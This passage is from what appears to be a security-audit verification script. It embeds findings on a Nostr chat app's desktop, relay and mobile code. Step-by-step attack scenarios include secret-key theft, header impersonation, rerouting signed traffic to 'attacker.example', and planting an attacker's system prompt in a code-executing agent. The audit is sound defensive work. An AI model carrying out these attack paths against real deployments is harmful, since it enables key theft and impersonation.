export const meta = {
  name: 'buzz-audit-verify',
  description: 'Phases 3-4 of the buzz audit: adversarial refute-by-default verification, then completeness critics',
  phases: [
    { title: 'Verify', detail: '12 batches x 3 lenses, refute-by-default, 2-of-3 to survive' },
    { title: 'Critic', detail: '3 completeness critics' },
  ],
}

const BATCHES = [
 [
  {
   "file": "desktop/src-tauri/src/commands/identity.rs",
   "line": 191,
   "severity": "critical",
   "category": "secret-exposure",
   "claim": "get_nsec is a Tauri command with no access control that returns the raw bech32-encoded secret key to any caller from the renderer/JS context.",
   "failure_scenario": "Any XSS'd webview content, a malicious dependency loaded into the frontend bundle, or a compromised renderer process can call invoke('get_nsec') and immediately obtain the user's full private key in plaintext, with no confirmation dialog, rate limit, or additional authentication required from Rust's side.",
   "evidence": "pub fn get_nsec(state: State<'_, AppState>) -> Result<String, String> {\n    let keys = state.signing_keys()?;\n    keys.secret_key()\n        .to_bech32()\n        .map_err(|error| format!(\"encode nsec: {error}\"))",
   "confidence": "high",
   "reported_slice": "tauri-commands (desktop/src-tauri/src/commands)",
   "gate_a": "evidence found near claimed line 191",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F001"
  },
  {
   "file": "crates/buzz-relay/src/api/bridge.rs",
   "line": 118,
   "severity": "critical",
   "category": "authentication-bypass",
   "claim": "The HTTP bridge accepts an unauthenticated, unsigned `X-Pubkey` header as proof of identity whenever `require_auth_token` is false \u2014 and `require_auth_token` defaults to false (crates/buzz-relay/src/config.rs:524-526, `std::env::var(\"BUZZ_REQUIRE_AUTH_TOKEN\")...unwrap_or(false)`). Every bridge read route passes that config flag straight through: `/query` (bridge.rs:908-914), `/count` (bridge.rs:1350-1356), and the moderation reads (bridge.rs:2091). The returned event id is `[0u8; 32]`, which `check_nip98_replay_with_guard` explicitly short-circuits (bridge.rs:150-152), so the replay guard is disarmed too. Three sibling surfaces in the same crate hardcode `true` for this same parameter because their authors judged the fallback unsafe \u2014 invites (api/invites.rs:255, comment \"invites always require NIP-98; no X-Pubkey dev fallback\") and operator (api/operator.rs:83) \u2014 so the bridge read routes are the inconsistent outlier, not a uniform policy. SECURITY.md states flatly that \"REST endpoints authenticate via NIP-98 HTTP Auth\", which the shipped default contradicts.",
   "failure_scenario": "Attacker knows any victim's Nostr public key (public by construction \u2014 it appears in every event the victim signs). Against a relay deployed without `BUZZ_REQUIRE_AUTH_TOKEN=true`, they send `POST /query` with `Host: <tenant host>`, no `Authorization` header, header `X-Pubkey: <victim 64-hex pubkey>`, body `[{}]`. `query_events` (bridge.rs:884) binds the tenant from Host, calls `verify_bridge_auth` (bridge.rs:908) which falls into the branch at line 118, returns `(victim_pubkey, [0u8;32])`. `query_events_authed` then resolves `accessible_channels` for the victim (bridge.rs:1005) and returns every event in every private channel the victim belongs to, plus their gift-wrap/DM metadata. No signature is ever checked. The same header impersonates a moderator on `GET /moderation/reports`.",
   "evidence": "    if !require_auth_token {\n        if let Some(hex_val) = headers.get(\"x-pubkey\").and_then(|v| v.to_str().ok()) {",
   "confidence": "high",
   "reported_slice": "relay",
   "gate_a": "evidence found near claimed line 118",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F002"
  },
  {
   "file": "desktop/src-tauri/src/commands/pairing.rs",
   "line": 146,
   "severity": "critical",
   "category": "authentication-gap",
   "claim": "confirm_pairing_sas is a Tauri command that unconditionally proceeds to send the pending payload (which embeds the user's nsec, built in start_pairing) once called \u2014 there is no server-side (Rust) verification that the SAS codes actually matched; the 'confirmation' is purely the renderer calling this function.",
   "failure_scenario": "A compromised renderer script calls start_pairing() (returning the QR/session URI, which encodes the pairing session so a remote attacker can act as the pairing peer over the relay) and then immediately calls confirm_pairing_sas() without any human visually comparing SAS codes. Because the SAS check is a UI-only human decision never re-validated in Rust, the payload (JSON containing the raw nsec, see line 111-115) is sent over the pairing relay session to whatever peer completed the offer/SAS steps \u2014 letting a remote attacker who scripted the peer side of the protocol exfiltrate the full identity secret key with only renderer-JS execution, no physical device access or user interaction.",
   "evidence": "pub async fn confirm_pairing_sas(pairing: State<'_, PairingHandle>) -> Result<(), String> {\n    let tx = pairing\n        .outbound_tx\n        .lock()\n        .map_err(|e| e.to_string())?\n        .clone()\n        .ok_or(\"no active pairing session\")?;",
   "confidence": "medium",
   "reported_slice": "tauri-commands (desktop/src-tauri/src/commands)",
   "gate_a": "evidence found near claimed line 146",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F003"
  },
  {
   "file": "desktop/src-tauri/src/commands/identity.rs",
   "line": 618,
   "severity": "high",
   "category": "recovery-mode-signing-gate-bypass",
   "claim": "`sign_nostr_identity_binding` is the only signing command in identity.rs that reads `state.keys.lock()` directly instead of `state.signing_keys()`, so it bypasses the recovery-mode gate that refuses signing when `identity_lost` or `keyring_locked` is set. Every neighbouring signer in the same file (`sign_event` L115, `create_auth_event` L646, `build_observer_control_event` L170, `nip44_encrypt_to_self` L672, `get_nsec` L192, `create_backup_with_log_n` L232) goes through `signing_keys()`; this one does not.",
   "failure_scenario": "The user's OS keyring is wiped or unreadable at boot, so `resolve_identity` sets `identity_lost`/`keyring_locked` and `state.keys` holds a throwaway ephemeral keypair that will not survive the next launch (app_state.rs:306-322 is what normally blocks all signing in this state). While the recovery banner is up, the user clicks a `buzz://nostr-bind?challenge_id=...&nonce=...&verification_code=...&origin=https://site.example&expires_at=...` deep link (deep_link.rs:246-281, 369), consents in NostrBindConsentDialog, and the command signs a kind:KIND_NOSTR_IDENTITY_BINDING event with the ephemeral key. The external site records that pubkey as the user's permanent Nostr identity. On the next launch the ephemeral key is gone, so the binding points at a key nobody controls \u2014 and any attacker who can reach that binding endpoint before it is revoked speaks as the 'bound' identity. The same path also lets the ephemeral key be bound while `keyring_locked`, i.e. while the user's real key still exists but is unreachable.",
   "evidence": "    let keys = state\n        .keys\n        .lock()\n        .map_err(|error| error.to_string())?\n        .clone();",
   "confidence": "high",
   "reported_slice": "tauri-commands (buzz/desktop/src-tauri/src/commands) \u2014 Lens B: cryptography, keys, identity",
   "gate_a": "evidence found near claimed line 618",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 2,
   "id": "F004"
  }
 ],
 [
  {
   "file": "desktop/src-tauri/src/commands/personas/inbound.rs",
   "line": 304,
   "severity": "high",
   "category": "vacuous-authorization-check",
   "claim": "The NIP-09 ownership check in `parse_deletion_coordinate` (L219: `if owner != event.pubkey.to_hex() { return None; }`) is self-referential and therefore vacuous: it only requires the coordinate to name its own signer as owner. The subsequent local-store removals key on the attacker-chosen d-tag alone and never compare the record's owner, so a validly signed kind:5 from ANY keypair deletes the local persona / team / managed-agent record whose d-tag matches. The comment at L216-218 claims this check 'closes the other half \u2014 a validly signed kind:5 naming ANOTHER owner's coordinate must no-op', which the code does not achieve.",
   "failure_scenario": "Attacker generates keypair A and signs a kind:5 event whose `a` tag is `30177:<A_pubkey_hex>:<victim_agent_pubkey_hex>`. The owner segment equals the signer, so L219 passes and `parse_deletion_coordinate` returns `(30177, victim_agent_pubkey)`. `event.verify()` at L194-196 passes because the event is genuinely signed by A. Reaching `reconcile_inbound_tombstone`, L302-305 executes `agents.retain(|record| record.pubkey != target_d_tag)`, deleting the victim's ManagedAgentRecord \u2014 which is where `private_key_nsec` and `auth_tag` live \u2014 and `save_managed_agents` commits it without the keyring cleanup that `agents.rs:1334` performs on the normal delete path, orphaning the keyring entry. The same shape with `30175:<A>:<victim_persona_d_tag>` (L292-296) or `30176:<A>:<victim_team_id>` (L297-301) destroys personas and teams. Reachable today from a compromised/XSS'd renderer invoking `reconcile_inbound_persona_event` directly; the relay-delivered path is currently blocked by the TS-only `authors:[pubkey]` filter in usePersonaSync.ts:39, which inbound.rs:187-189 itself declares to be 'no defense'.",
   "evidence": "        KIND_MANAGED_AGENT => {\n            let mut agents = load_managed_agents(app)?;\n            agents.retain(|record| record.pubkey != target_d_tag);\n            save_managed_agents(app, &agents)?;\n        }",
   "confidence": "high",
   "reported_slice": "tauri-commands (buzz/desktop/src-tauri/src/commands) \u2014 Lens B: cryptography, keys, identity",
   "gate_a": "evidence found near claimed line 304",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 2,
   "id": "F005"
  },
  {
   "file": "desktop/src-tauri/src/commands/profile.rs",
   "line": 80,
   "severity": "high",
   "category": "data-loss",
   "claim": "`update_profile` does a read-merge-write of the replaceable kind:0 profile but the merge only carries five fields forward. `build_profile` (events.rs:474-499) can only emit `display_name`, `name`, `picture`, `about`, `nip05`; every other key that was in the prior kind:0 content is silently dropped from the newly signed replacement event.",
   "failure_scenario": "A user has a kind:0 with `banner`, `website`, `lud16` (a Lightning address) set from any other Nostr client \u2014 buzz reads it fine because it only picks out five keys and ignores the rest. The user then edits their About text in buzz. `update_profile` reads the prior event (line 49-57), pulls only display_name/name/picture/about/nip05 out of `current` (lines 66-78), and calls `build_profile` with exactly those five. The relay replaces the old kind:0 (buzz-db/src/lib.rs replace_addressable_event soft-deletes the prior row), so banner/website/lud16 are gone from the network with no warning and no local copy. Their Lightning address stops working everywhere.",
   "evidence": "    let builder = events::build_profile(dn, name, picture, ab, nip05)?;",
   "confidence": "high",
   "reported_slice": "tauri-commands (deep pass, Lens C \u2014 correctness)",
   "gate_a": "evidence found near claimed line 80",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 2,
   "id": "F006"
  },
  {
   "file": "desktop/src/shared/api/relayClosedRecovery.ts",
   "line": 141,
   "severity": "high",
   "category": "correctness",
   "claim": "A live subscription's reconnect watermark `lastSeenCreatedAt` is set from the raw, unvalidated `created_at` of every inbound relay EVENT, so one event with a far-future timestamp permanently poisons the watermark and every subsequent reconnect replays with a `since` in the future \u2014 silently dropping all missed messages for that subscription for the rest of the session.",
   "failure_scenario": "Attacker path: (1) any community member (or the relay itself) publishes a kind:9/kind:11 event into channel X with `created_at = 4102444800` (year 2100). The relay's ingest path does not bound future timestamps \u2014 crates/buzz-relay/src/handlers/command_executor.rs:121-125 only rejects timestamps that `chrono::DateTime::from_timestamp` cannot represent \u2014 so the event is stored and fanned out. (2) The victim's client receives it: relayClientSession.ts:783 matches the `EVENT` frame and calls `this.handleEvent(rest[0], rest[1] as RelayEvent)` with zero shape or range validation. (3) relayClientSession.ts:859 calls `prepareSubscriptionEvent(subscription, event)`. (4) relayClosedRecovery.ts:141-144 executes `subscription.lastSeenCreatedAt = Math.max(lastSeenCreatedAt ?? 0, event.created_at)` \u2192 the watermark becomes 4102444800 and can never be lowered (Math.max). (5) On the next socket drop, relayClientSession.ts:934 calls `replayLiveSubscriptions`, which at relayReconnectReplay.ts:170-176 computes `replaySince = max(0, 4102444800 - 5)` and at relayReconnectReplay.ts:61 builds the REQ filter with `since: Math.max(filter.since, since)`. (6) The REQ sent at relayReconnectReplay.ts:213-219 asks the relay for events newer than the year 2100, so the relay returns nothing. The victim's channel silently stops backfilling on every reconnect from then on \u2014 no error, no UI indication, and the paged-replay branch (`replayReconnectHistoryPages`, since > until) exits immediately too. One attacker message permanently breaks reconnect recovery for every client subscribed to that channel.",
   "evidence": "  subscription.lastSeenCreatedAt = Math.max(\n    subscription.lastSeenCreatedAt ?? 0,\n    event.created_at,\n  );",
   "confidence": "high",
   "reported_slice": "desktop-shared (buzz/desktop/src/shared)",
   "gate_a": "evidence found near claimed line 141",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 2,
   "id": "F007"
  },
  {
   "file": "crates/buzz-relay/src/api/media.rs",
   "line": 96,
   "severity": "high",
   "category": "resource-exhaustion",
   "claim": "The media upload rate limiter is a plain DashMap keyed by (community_id, uploader pubkey) that is inserted into on every upload attempt and never evicted, swept, or capped, so an attacker who mints fresh Nostr keypairs grows relay heap without bound. The per-pubkey rate limit cannot slow this: each fresh key is a brand-new window, and the rate limiter is the very thing being grown. This is the exact threat the same file's sibling limiter was hardened against \u2014 state.rs declares invite_claim_rate_limiter as a capacity-and-TTL-bounded moka cache with the comment 'the cache has a hard capacity because pre-membership callers can cheaply generate fresh Nostr keys', while media_upload_rate_limiter (state.rs:592) is Arc<DashMap> with no such bound. Contrast also media_uploads_in_flight, whose UploadPermit::drop (media.rs:74-86) correctly removes its entry.",
   "failure_scenario": "On a default deployment (require_relay_membership defaults to false \u2014 crates/buzz-relay/src/config.rs:1018-1019 asserts this), an attacker loops: generate a secp256k1 keypair (~50us, free), sign a kind:24242 Blossom auth event with a valid t/x/expiration tag set, and PUT /upload with a small body and a matching X-SHA-256. Each request passes bind_community (media.rs:165), verify_blossom_auth_event (media.rs:177), the x-tag check (media.rs:195-201) and the open-relay membership short-circuit (api/mod.rs:67-69), then reaches upload_rate_limited (media.rs:220), which permanently inserts a (16-byte CommunityId + 32-byte pubkey) -> (u32, Instant) entry. Nothing ever removes it. At roughly 100 bytes of resident heap per distinct key including DashMap overhead, ~10 million requests (easily sustained over hours at a few hundred req/s, and the request itself can be rejected afterwards for any reason \u2014 the entry is already inserted) pins ~1 GB, growing linearly until the relay process is OOM-killed. Even on a closed relay the map is unbounded in the number of distinct member keys that ever uploaded and is never reclaimed for the lifetime of the process.",
   "evidence": "    let mut entry = state\n        .media_upload_rate_limiter\n        .entry(key)\n        .or_insert((0, now));",
   "confidence": "high",
   "reported_slice": "media",
   "gate_a": "evidence found near claimed line 96",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 2,
   "id": "F008"
  }
 ],
 [
  {
   "file": "crates/buzz-relay/src/audio/handler.rs",
   "line": 244,
   "severity": "high",
   "category": "authz-bypass",
   "claim": "The huddle-audio WebSocket auth path re-implements NIP-42 admission but omits the community ban gate (and the pubkey allowlist gate) that the main WebSocket auth path enforces. `moderation_restriction_state` is called in exactly four places in buzz-relay \u2014 handlers/auth.rs:121, handlers/auth.rs:143, handlers/ingest.rs:1998, handlers/moderation_commands.rs:105, handlers/relay_admin.rs:168 \u2014 and none of them is on the audio path; `enforce_relay_membership` (api/mod.rs:124-145) contains no ban check either, and `ensure_membership` (audio/handler.rs:1153-1215) returns Ok for any channel whose visibility is \"open\". handlers/auth.rs:96-100 states the intended invariant explicitly: a ban 'must block connection auth even for open channels \u2014 enforcement is structural, not filtered later'.",
   "failure_scenario": "A pubkey is banned in community C. Its main relay WebSocket is refused at handlers/auth.rs:159-182 and its event writes are refused at handlers/ingest.rs:1998. The same actor then opens `GET /huddle/{channel_id}/audio` (registered at router.rs:125-128), receives the challenge generated at audio/handler.rs:175, signs a kind:22242 AUTH event, and passes `verify_auth_event` at audio/handler.rs:222. `enforce_relay_membership` at line 244 succeeds (the actor is still a relay member \u2014 a ban is not a membership removal), `ensure_membership` returns Ok because the huddle channel is open or its parent membership still exists, and the banned actor joins live voice in the community they were banned from. The same gap lets a pubkey excluded by `pubkey_allowlist_enabled` (checked only at handlers/auth.rs:187-214) into audio.",
   "evidence": "    if crate::api::relay_members::enforce_relay_membership(\n        &state,\n        tenant.community(),\n        pubkey.as_bytes(),\n        auth_tag_json.as_deref(),\n    )",
   "confidence": "high",
   "reported_slice": "auth (crates/buzz-auth, crates/buzz-acp) + the call sites where their auth decisions are made or re-made",
   "gate_a": "evidence found near claimed line 244",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 2,
   "id": "F009"
  },
  {
   "file": "crates/buzz-relay/src/handlers/ingest.rs",
   "line": 2733,
   "severity": "high",
   "category": "correctness",
   "claim": "Ingesting a kind:7 (NIP-25 reaction) that targets a channel-less/global event (e.g. a kind:1 text note, which is always global per is_global_only_kind) leaves channel_id as None, and the tracing code on this line unconditionally does channel_id.expect(\"reaction path has channel\"), which panics.",
   "failure_scenario": "An authenticated user with ordinary MessagesWrite scope submits EVENT kind:7 with an `e` tag pointing at any previously-stored global event (e.g. a kind:1 text note authored by anyone). derive_reaction_channel looks up the target, finds target.channel_id == None (global events have no channel), and returns ReactionChannelResult::NoChannel, so `channel_id` stays None all the way through ingest_event_inner (KIND_REACTION is not in is_global_only_kind or requires_h_channel_scope, so nothing forces channel_id back to Some or rejects the event). Execution reaches the reaction-storage block, calls insert_reaction_event_with_thread_metadata successfully, and then hits `channel_id.expect(\"reaction path has channel\")` on this line (and the identical call three lines later for the WriteDuplicate branch), which panics because channel_id is None. This crashes/aborts the request-handling task for any client that reacts to a global-scope event \u2014 trivially reachable, repeatable denial-of-service against the ingest pipeline from any authenticated peer.",
   "evidence": "channel: channel_label(channel_id.expect(\"reaction path has channel\")),",
   "confidence": "high",
   "reported_slice": "crates/buzz-relay",
   "gate_a": "evidence found near claimed line 2733",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F010"
  },
  {
   "file": "web/src/shared/lib/nostr-client.ts",
   "line": 135,
   "severity": "high",
   "category": "auth-verification-gap",
   "claim": "queryEvents() pushes every relay-supplied EVENT payload straight into the results array and returns it to callers with no signature or id verification anywhere in the module (or anywhere else in the web slice \u2014 grep for verifyEvent/verifySignature found zero matches).",
   "failure_scenario": "A malicious or compromised relay (or a MITM on the WebSocket, or any code path that can inject EVENT frames) can send an event with an arbitrary `pubkey` field and fabricated `id`/`sig` that is never checked. Every consumer (use-repos.ts eventToRepo(), use-repo-refs.ts parseRefs()) trusts `event.pubkey` as the content's signer/owner and renders it as-is (PubkeyAvatar, repo owner/contributor lists), so an attacker-controlled relay can impersonate any pubkey to the browser client with no cryptographic contradiction ever surfacing to the user.",
   "evidence": "if (type === \"EVENT\" && data[1] === subId && data[2]) {\n        events.push(data[2] as NostrEvent);",
   "confidence": "high",
   "reported_slice": "web (buzz/web/src, buzz/admin-web/src)",
   "gate_a": "evidence found near claimed line 135",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F011"
  },
  {
   "file": "desktop/src-tauri/src/commands/personas/inbound.rs",
   "line": 344,
   "severity": "high",
   "category": "missing-authorization",
   "claim": "`reconcile_inbound_persona_event` verifies the inbound event's Schnorr signature but never checks that `event.pubkey` equals the local owner's pubkey. `apply_inbound_persona` then matches purely on the `d`-tag and overwrites `system_prompt`, `model`, `provider`, and `respond_to_allowlist` on the local persona. Any validly-signed kind:30175 from ANY author whose d-tag collides with a local persona's d-tag rewrites that persona on disk. The only owner check in the whole flow lives in TypeScript (`usePersonaSync.ts:39` \u2014 `if (event.pubkey !== pubkey) return;`), which the Rust file's own doc comment at line 188 dismisses as \"no defense\", yet no Rust-side equivalent was added.",
   "failure_scenario": "A compromised/XSS'd renderer (the stated threat model for this slice) invokes `reconcile_inbound_persona_event(eventJson, arrivalRelayUrl)` directly, bypassing the TS filter in `usePersonaSync.ts:39`. The attacker supplies a kind:30175 event signed with the ATTACKER's own key (so `parse_verified_inbound_event` at inbound.rs:190-197 passes) carrying `[\"d\", \"<victim persona d_tag>\"]` and a content blob whose `system_prompt` is attacker-chosen and whose `respond_to_allowlist` contains the attacker's pubkey. Control flows: reconcile_inbound_persona_event (inbound.rs:56) -> reconcile_inbound_persona_event_blocking (inbound.rs:68) -> parse_verified_inbound_event (inbound.rs:190, signature only) -> apply_inbound_persona (inbound.rs:342) -> save_personas. The next time the user starts that agent, `start_local_agent_with_preflight` (agents.rs:419-431) calls `apply_persona_snapshot(record, persona)` to re-snapshot the persona onto the record, so the attacker's system prompt becomes the running agent's instructions and the attacker's pubkey is on its respond-to allowlist \u2014 i.e. attacker-controlled instructions inside a code-executing agent.",
   "evidence": "    match personas\n        .iter_mut()\n        .find(|record| persona_d_tag(record) == d_tag)",
   "confidence": "high",
   "reported_slice": "tauri-commands",
   "gate_a": "evidence found near claimed line 344",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F012"
  }
 ],
 [
  {
   "file": "desktop/src-tauri/src/commands/workspace.rs",
   "line": 168,
   "severity": "high",
   "category": "input-validation",
   "claim": "`apply_workspace` takes a `relay_url: String` straight from the renderer and stores it as the process-wide `relay_url_override` with no parsing, scheme check, or origin allowlist. That override is the base for `relay_api_base_url_with_override` (relay.rs:50), which is (a) the target of every `query_relay`/`submit_event` call in this slice and (b) the allowlist base that `validate_download_url` (media_download.rs:31-50) compares media URLs against. One renderer-controlled command therefore redirects all NIP-98-authenticated relay traffic AND neuters the media SSRF guard. The same command also swaps `state.keys` from a renderer-supplied `nsec` (line 176-177) without taking `state.identity_mutation`, the lock every other identity-mutating path in identity.rs (lines 229, 354, 476) takes for exactly this reason.",
   "failure_scenario": "A compromised renderer calls `apply_workspace(relay_url: \"https://attacker.example\", nsec: null, repos_dir: null, agent_managed_profiles: null)`. `relay_http_base_url` (relay.rs:73-85) passes a non-ws:// string through unchanged, so `relay_api_base_url_with_override` now returns `https://attacker.example`. From that point: every `query_relay` (relay.rs:315-341) POSTs to `https://attacker.example/query` with an `Authorization` header minted by `build_nip98_auth_header` using the user's real signing key, and every `submit_event` delivers the user's freshly-signed events to the attacker (portable signed Nostr events the attacker can then replay onto the real workspace relay). Simultaneously `validate_download_url(url, relay_base)` (media_download.rs:48) now accepts `https://attacker.example/media/...`, so `fetch_media_bytes`, `download_file`, `download_image`, and `copy_image_to_clipboard` will fetch attacker-controlled bytes with the media auth header attached. Separately, `*keys_guard = keys` at workspace.rs:176-177 can land between `persist_current_identity`'s `identity_mutation` acquisition (identity.rs:476) and its key clone (identity.rs:486), so the keyring gets persisted with a key that is no longer the live identity.",
   "evidence": "            let mut override_guard = state.relay_url_override.lock().map_err(|e| e.to_string())?;\n            *override_guard = Some(relay_url);",
   "confidence": "high",
   "reported_slice": "tauri-commands",
   "gate_a": "evidence found near claimed line 168",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F013"
  },
  {
   "file": "desktop/src/features/messages/lib/formatTimelineMessages.ts",
   "line": 239,
   "severity": "high",
   "category": "parser-differential-authorship-spoofing",
   "claim": "The desktop resolves a kind:40003 edit's target using the LAST valid `e` tag (getReactionTargetId at formatTimelineMessages.ts:118-131 iterates `for (let index = tags.length - 1; index >= 0; index -= 1)`), while the relay authorises the same event against the FIRST valid `e` tag (crates/buzz-relay/src/handlers/ingest.rs:790-806, `event.tags.iter().find_map(...)` inside validate_edit_ownership). Nothing constrains the number of `e` tags on kind:40003 \u2014 the e-tag cardinality check at ingest.rs:2331-2343 applies only to KIND_DELETION/KIND_NIP29_DELETE_EVENT \u2014 so a two-`e`-tag edit is authorised against one message and applied to a different one. The result is that any channel member can overwrite the rendered body (and, via applyEditTagOverlay at line 472, the imeta attachments) of another member's message, which still renders under the victim's name and avatar.",
   "failure_scenario": "Mallory is an ordinary member of #general. (1) She posts her own message M_m and notes its id. (2) She publishes kind:40003 with tags `[[\"h\", channelId], [\"e\", M_m_id], [\"e\", M_victim_id]]` and content \"I've transferred the keys to mallory@evil.example \u2014 use that from now on\". (3) Relay ingest: validate_edit_ownership (ingest.rs:790) takes the FIRST `e` tag = M_m_id, looks up M_m, finds effective author == Mallory (ingest.rs:829-831), re-checks her channel membership, and accepts; the generic membership gate is skipped for 40003 (ingest.rs:2152-2158) precisely because this validator is meant to be authoritative. (4) The event is stored and fanned out to every subscriber of #general. (5) On each desktop client, formatTimelineMessages line 239 calls getReactionTargetId, which scans tags backwards and returns M_victim_id; line 245-251 records `editsByTargetId[M_victim_id] = {content: Mallory's text, tags: Mallory's tags}`; line 460 renders `body: edit.content` and line 472 overlays Mallory's imeta tags onto the victim's event, under `pubkey`/`author`/`avatarUrl` resolved from the victim's original event. The only visual cue is the ordinary \"edited\" marker (`edited: edit !== undefined`, line 466). The same tag ordering is treated consistently (last-wins) by the relay for reactions (derive_reaction_channel uses `.iter().rev()` at ingest.rs:351), which is why the edit path's forward `find_map` reads as an oversight rather than an intentional convention.",
   "evidence": "    const targetId = getReactionTargetId(event.tags);\n    if (!targetId || deletedEventIds.has(targetId)) {",
   "confidence": "high",
   "reported_slice": "desktop-messages (deep pass, Lens B \u2014 cryptography, keys, identity)",
   "gate_a": "evidence found near claimed line 239",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F014"
  },
  {
   "file": "mobile/lib/features/channels/timeline_message.dart",
   "line": 356,
   "severity": "high",
   "category": "parser-differential",
   "claim": "The mobile timeline resolves a kind:40003 edit event's target using the LAST `e` tag (`_lastETag`, line 586: it scans `for (var i = tags.length - 1; i >= 0; i--)`), while the relay authorizes the same event against the FIRST 64-hex `e` tag (crates/buzz-relay/src/handlers/ingest.rs `validate_edit_ownership`, which does `event.tags.iter().find_map(...)`). Unlike kind:5/9005 deletions \u2014 which the relay explicitly caps at exactly one e/a tag (ingest.rs ~line 2338, `(e_count + a_count) != 1`) \u2014 there is no e-tag count restriction on kind:40003, and kind:40003 is in the relay's `skip_membership` list precisely because `validate_edit_ownership` is meant to be the sole authority. The client applies the edit with no author comparison at all: it overwrites both the target's `content` and its `tags` (line 473 `final effectiveTags = edit?.tags ?? event.tags;`, line 489 `content: edit?.content ?? event.content`) while keeping the original event's `pubkey`, so the forged text renders under the victim's name and avatar.",
   "failure_scenario": "Mallory is a member of channel #eng. She posts an ordinary message M_a. She then publishes a kind:40003 event with tags [[\"h\", \"<eng-channel-id>\"], [\"e\", \"<M_a id>\"], [\"e\", \"<Alice's message id>\"]] and content \"approved, wire the funds to acct 12345\". The relay's validate_edit_ownership reads the first e tag (M_a), sees author == actor, and accepts and fans out the event. Every mobile client that renders #eng runs formatTimeline over the channel window; `_lastETag` returns Alice's message id, so `edits[<Alice's message id>]` is set to Mallory's content and Mallory's tags. Alice's message row now displays Mallory's text, attributed to Alice's pubkey/display name/avatar, marked only with the generic 'edited' flag \u2014 and because `effectiveTags` comes from Mallory's event, Mallory also controls the p/mention tags rendered on Alice's message.",
   "evidence": "    if (event.kind != EventKind.streamMessageEdit) continue;\n    if (deletedIds.contains(event.id)) continue;\n\n    final targetId = _lastETag(event.tags);",
   "confidence": "high",
   "reported_slice": "mobile",
   "gate_a": "evidence found near claimed line 356",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F015"
  },
  {
   "file": "mobile/android/app/src/main/kotlin/xyz/block/buzz/mobile/MainActivity.kt",
   "line": 263,
   "severity": "high",
   "category": "correctness-crash",
   "claim": "handleTranscodeVideoToMp4 invokes MethodChannel.Result (result.success / result.error) from a raw background Thread, violating Flutter's platform-thread contract for channel replies; FlutterJNI's ensureRunningOnMainThread throws a RuntimeException, which is uncaught in the plain Thread and crashes the app. Every Android video upload attempt hits this path.",
   "failure_scenario": "User taps attach video in compose_bar -> MediaUploadService.uploadVideo (mobile/lib/shared/relay/media_upload.dart:264) -> _transcodePickedVideoToMp4 (media_upload.dart:742) -> invokeMethod('transcodeVideoToMp4') -> MainActivity.handleTranscodeVideoToMp4 spawns Thread{} (MainActivity.kt:216) and, on completion, calls result.success(outputFile.absolutePath) (line 263) on that background thread. The engine throws RuntimeException('Methods marked with @UiThread must be executed on the main thread'), the thread's default uncaught-exception handler terminates the process. The error path (result.error at line 266) has the same defect, so even a failed transcode crashes instead of reporting an error. Fix is runOnUiThread{}/Handler(mainLooper) around the reply.",
   "evidence": "                muxer.stop()\n                result.success(outputFile.absolutePath)",
   "confidence": "high",
   "reported_slice": "mobile",
   "gate_a": "evidence found near claimed line 263",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F016"
  }
 ],
 [
  {
   "file": "mobile/lib/shared/relay/relay_session.dart",
   "line": 462,
   "severity": "high",
   "category": "data-loss",
   "claim": "lastSeenCreatedAt is advanced when an event is merely buffered (before delivery), but _handleDisconnected clears _eventBuffer without rolling lastSeenCreatedAt back; the reconnect replay then uses since = lastSeenCreatedAt - 5s, so buffered-but-undelivered events older than that are permanently lost to the live subscription.",
   "failure_scenario": "Flaky network: after a reconnect, _replayLiveSubscriptions (line 416) delivers a burst covering the whole disconnect gap (possibly minutes of messages). _handleEvent buffers them and advances liveSub.lastSeenCreatedAt to the newest event's timestamp (lines 462-465) while they sit in _eventBuffer awaiting the 16ms flush timer. The connection drops again inside that window -> _handleDisconnected runs _eventBuffer.clear() (line 387) so onEvent never fires for any of them, yet lastSeenCreatedAt still points at the newest. The next replay sends since = newest-5s, so every discarded event older than 5s before the newest is never redelivered. Note _handleEose only flushes for subscriptions with a readyCompleter (initial subscribe), not reconnect replays. User sees messages silently missing from open channel timelines until a full history refetch.",
   "evidence": "      if (liveSub.lastSeenCreatedAt == null ||\n          event.createdAt > liveSub.lastSeenCreatedAt!) {\n        liveSub.lastSeenCreatedAt = event.createdAt;\n      }",
   "confidence": "high",
   "reported_slice": "mobile",
   "gate_a": "evidence found near claimed line 462",
   "reported_by": [
    ".None/None"
   ],
   "duplicate_count": 1,
   "id": "F017"
  },
  {
   "file": "mobile/lib/features/pairing/pairing_provider.dart",
   "line": 103,
   "severity": "high",
   "category": "authentication-bypass",
   "claim": "Any input that does not start with `nostrpair://` silently falls back to the legacy pairing flow, which base64-decodes an attacker-supplied JSON blob and imports its `nsec` + `relayUrl` as the active identity with no SAS, no transcript-hash check, no signature check and no confirmation dialog \u2014 a protocol downgrade the attacker chooses. The modern NIP-AB path (`_pairNipAb`) requires a 6-digit SAS the user must visually match; the legacy path requires nothing. The QR scanner feeds raw barcode text straight in: PairingPage.handleScannerResult -> `pair(code)` (pairing_provider.dart:91) -> `_pairLegacy` (line 103) -> `_parseLegacyInput` (line 625) -> `_validateCredentials` (line 569) -> `authenticateWithCommunity` (line 574), which writes the attacker's nsec to secure storage and switches the app to the attacker's relay. Grepping the whole repo shows no component still produces this legacy format (desktop's `desktop/src-tauri/src/commands/pairing.rs` and `crates/buzz-core/src/pairing/qr.rs` emit only `nostrpair://`), so this is a dead-but-live credential-injection path.",
